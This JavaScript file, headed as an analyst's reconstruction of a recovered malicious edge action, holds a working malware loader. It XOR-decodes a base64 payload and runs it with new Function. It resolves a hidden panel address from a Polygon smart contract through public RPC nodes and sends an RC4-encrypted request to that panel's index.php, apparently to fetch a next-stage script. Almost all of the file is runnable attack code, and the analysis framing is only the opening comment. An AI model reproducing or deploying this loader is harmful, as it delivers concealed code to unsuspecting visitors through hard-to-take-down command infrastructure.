// Analyst reconstruction of the recovered edge action and its decoded loader.
(function runEncodedAction() {
  const xorKey = 0x06;
  const encodedAction = "Li4vOzh9cW9oYmlxKFlZdXJnYWNZamlnYmNiO3J0c2M9ey8uLz0=";

  function unpackAction(value, key) {
    value = atob(value);
    const bytes = new Uint8Array(value.length);
    for (let i = 0; i < value.length; i++) {
      bytes[i] = value.charCodeAt(i) ^ key;
    }
    return new TextDecoder("utf-8").decode(bytes);
  }

  const decodedAction = unpackAction(encodedAction, xorKey);
  (new Function(decodedAction))();
})();

const RPC_ENDPOINTS = [
  "https://polygon-bor-rpc.publicnode.com",
  "https://polygon.gateway.tenderly.co",
  "https://polygon.lava.build"
];

const CONTRACT = "0x224579e572cEEc5309A7d9F5fAf85dea5dBb7D4A";
const SELECTOR = "0xb68d1809";
const API_KEY = "cb9ef8804138983511a1dd21ad6839d03c00a9672807de414ec5eaaa7eb4390a";

function decodeAbiString(hexResult) {
  const bytes = Uint8Array.from(
    hexResult.slice(2).match(/.{2}/g),
    byte => parseInt(byte, 16)
  );
  return new TextDecoder("utf-8").decode(bytes).replace(/\0+$/, "");
}

async function resolvePanelOrigin() {
  for (const rpcEndpoint of RPC_ENDPOINTS) {
    const response = await fetch(rpcEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        method: "eth_call",
        params: [{ to: CONTRACT, data: SELECTOR }, "latest"],
        id: 1
      })
    });
    const rpcResult = await response.json();
    if (rpcResult.result) return decodeAbiString(rpcResult.result);
  }
  throw new Error("contract lookup failed");
}

function rc4(key, data) {
  const state = new Uint8Array(256);
  let i;
  let j = 0;
  for (i = 0; i < 256; i++) state[i] = i;
  for (i = 0; i < 256; i++) {
    j = (j + state[i] + key.charCodeAt(i % key.length)) & 0xff;
    [state[i], state[j]] = [state[j], state[i]];
  }

  const output = new Uint8Array(data.length);
  i = 0;
  j = 0;
  for (let offset = 0; offset < data.length; offset++) {
    i = (i + 1) & 0xff;
    j = (j + state[i]) & 0xff;
    [state[i], state[j]] = [state[j], state[i]];
    output[offset] = data[offset] ^ state[(state[i] + state[j]) & 0xff];
  }
  return output;
}

function base64Url(bytes) {
  return btoa(String.fromCharCode(...bytes))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

async function requestPanel(action, mode) {
  const nonce = new Uint8Array(8);
  crypto.getRandomValues(nonce);
  const query = new TextEncoder().encode(`a=${action}&mode=${mode}`);
  const cipher = rc4(API_KEY + String.fromCharCode(...nonce), query);
  const envelope = new Uint8Array(nonce.length + cipher.length);
  envelope.set(nonce);
  envelope.set(cipher, nonce.length);

  const panelOrigin = await resolvePanelOrigin();
  return fetch(`${panelOrigin}/api/index.php?q=${base64Url(envelope)}`);
}

requestPanel("js", "cloudflare");
